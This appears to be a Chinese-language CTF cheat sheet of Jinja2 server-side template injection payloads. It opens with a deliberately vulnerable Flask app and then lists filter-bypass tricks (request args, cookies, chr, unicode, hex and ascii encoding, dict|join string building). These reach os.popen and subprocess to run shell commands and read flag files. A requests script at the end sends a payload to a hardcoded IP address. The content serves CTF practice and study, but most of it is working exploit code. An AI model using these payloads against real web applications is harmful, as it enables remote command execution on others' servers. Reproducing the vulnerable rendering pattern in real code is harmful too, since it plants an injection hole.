[GitHub - Marven11/Fenjing: 专为CTF设计的Jinja2 SSTI全自动绕WAF脚本 | A Jinja2 SSTI cracker for bypassing WAF](https://github.com/Marven11/Fenjing)

```
from flask import Flask,request,render_template_string,render_template

app=Flask(__name__)
@app.route('/')
def print_hi():
    print(f'Hi, {request.args.get("name")}')
    return render_template_string(f'hello{request.args.get("name")}',)

if __name__ == '__main__':
    app.run()
```



##### SSTI数字被过滤

```
可以找到其他可选用类

全角字符代替普通字符

def half2full(half):  
    full = ''  
    for ch in half:  
        if ord(ch) in range(33, 127):  
            ch = chr(ord(ch) + 0xfee0)  
        elif ord(ch) == 32:  
            ch = chr(0x3000)  
        else:  
            pass  
        full += ch  
    return full  
t=''
s="0123456789"
for i in s:
    t+='\''+half2full(i)+'\','
print(t)
```



##### SSTI单双引号被过滤

```
用request请求绕过

?name={{1.__class__.__base__.__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()}}&a=ls

?name={{1.__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.b](request.args.a).read()}}&b=popen&a=cat ../flag

当request.args.a(GET)被过滤，可以用request.values.a(GET、POST)，request.cookies.a(Cookies)



用chr绕过

先用bp爆破，测试出能用chr的类
{{().__class__.__bases__[0].__subclasses__()[§0§].__init__.__globals__.__builtins__.chr}}


?name={%set+chr=[].__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.chr%}{{ config.__class__.__init__.__globals__[chr(111)%2bchr(115)].popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read() }}
```



##### 方括号被过滤

```
采用__getitem__()或pop()    (与方括号相同，pop有可能报错,因为会删除里面的键)



?name={{1.__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.b)(request.values.a).read()}}
&a=cat ../flag
```



##### .点被过滤

```
""|attr("__class__")
相当于
"".__class__
```



##### 下划线被过滤

```
可以配合上例进行过滤

?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}

cookies: a=__globals__;b=ls ../


?name={{(abc|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c))(request.cookies.d).eval(request.cookies.e)}}

Cookie:a=__init__;b=__globals__;c=__getitem__;d=__builtins__;e=__import__('os').popen('cat /flag').read()
```



#### OS被过滤

```
可以用.get(request.cookies.a).进行拼接
```

以下为用 `{% %}` 绕过



##### {{ 被过滤

```
使用{% %}绕过，在使用print()回显


?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}
&a=__globals__
&b=os
&c=cat /flag
```



##### 关键词被过滤

```
字符串可以用"~"进行拼接，或者直接进行拼接

()['__cla''ss__']
()['__cla'~'ss__']

{{()['__cla'~'ss__']['__m''ro__'][1]['__subcl''asses__']()[295]['__in''it__']['__gl''obals__']['po''pen']('cat /Th1s_is__F1114g').read()}}
```

##  编码绕过

我们将attr()中的属性可以用unicode进行编码，从而进行绕过

```
示例：
{%print(lipsum|attr("\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F")|attr("\u0067\u0065\u0074")("\u006F\u0073")|attr("\u0070\u006F\u0070\u0065\u006E")("tac%09/f???")|attr("read")())%}
```

我们也可以用 Hex 编码配合 `|attr()` 进行 Bypass，和上面那个一样，只不过是将 Unicode 编码换成了 Hex 编码，适用于 “u” 被过滤了的情况。

我们可以将过滤掉的字符用 Hex 编码替换掉：

```
{{()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(258)|attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("os")|attr("popen")("cat\x20\x66\x6c\x61\x67\x2e\x74\x78\x74")|attr("read")()}}
```

还可以采用ascii进行绕过

```
{%print lipsum|attr("%c%c%c%c%c%c%c%c%c%c%c"%(95,95,103,108,111,98,97,108,115,95,95))|attr("%c%c%c%c%c%c%c%c%c%c%c"%(95,95,103,101,116,105,116,101,109,95,95))("%c%c%c%c%c%c%c%c%c%c%c%c"%(95,95,98,117,105,108,116,105,110,115,95,95))|attr("%c%c%c%c%c%c%c%c%c%c%c"%(95,95,103,101,116,105,116,101,109,95,95))("%c%c%c%c%c%c%c%c%c%c"%(95,95,105,109,112,111,114,116,95,95))("os")|attr("popen")("%c%c%c%c%c%c%c%c%c"%(99,97,116,32,47,102,108,97,103))|attr("read")()%}
```

##### request 被过滤

```
?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(24)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
{%print(x.open(file).read())%}//设置变量


构造po="pop"     #利用dict()|join拼接得到
{% set po=dict(po=a,p=a)|join%}
 
等效于a=(()|select|string|list).pop(24),即a等价于下划线_
{% set a=(()|select|string|list)|attr(po)(24)%}
 
构造ini="___init__"
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
 
构造glo="__globals__"
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
 
构造geti="__getitem__"
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
 
构造built="__builtins__"
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
 
调用chr()函数
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
 
构造file='/flag'
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
```



```
{%set ce='OS'|lower%}
{%set ndll={}|select()|trim|list|batch(25)|first|last%}
{%set go=ndll*2+'globals'+ndll*2%}
{%set gi=ndll*2+'g''etitem'+ndll*2%}
{%set bi=ndll*2+'builtins'+ndll*2%}
{%set ip=ndll*2+'import'+ndll*2%}
{%print lipsum|attr(go)|attr(gi)(bi)|attr(gi)(ip)(ce)|attr('p''open')('cat /flag')|attr('read')()%}
```

```
import requests

'''s="<generator object select_or_reject at 0x0000022717FF33C0>"
item="subclasses"
for j in item:
    for i in s:
        if i==j:
            print(j,f"(po|string)[{i}]~~")
'''
url="http://39.100.87.38:29063/"
payload='''
{% set pa=dict(class=a)|join%}
{% set pb=dict(base=a)|join%}
{% set pc=dict(subclasses=a)|join%}
{% set pd=dict(init=a)|join%}
{% set pe=dict(globals=a)|join%}
{% set popen=dict(Popen=a)|join%}
{% set ls=dict(dir=a)|join%}
{% set read=dict(read=a)|join%}

{{
()[
(pd|string)[]
(()|select|string)[24]~
(()|select|string)[24]~
pa~
(()|select|string)[24]~
(()|select|string)[24]
]
[
(()|select|string)[24]~
(()|select|string)[24]~
pb~
(()|select|string)[24]~
(()|select|string)[24]
]
[
(()|select|string)[24]~
(()|select|string)[24]~
pc~
(()|select|string)[24]~
(()|select|string)[24]
]()[258]
[
(()|select|string)[24]~
(()|select|string)[24]~
pd~
(()|select|string)[24]~
(()|select|string)[24]
]
[
(()|select|string)[24]~
(()|select|string)[24]~
pe~
(()|select|string)[24]~
(()|select|string)[24]
]
}}
'''
param={"name":payload}
req=requests.get(url,params=param)
print(req.text)
```

[SSTI模板注入绕过（进阶篇）_ssti绕过-CSDN博客](https://blog.csdn.net/miuzzx/article/details/110220425)
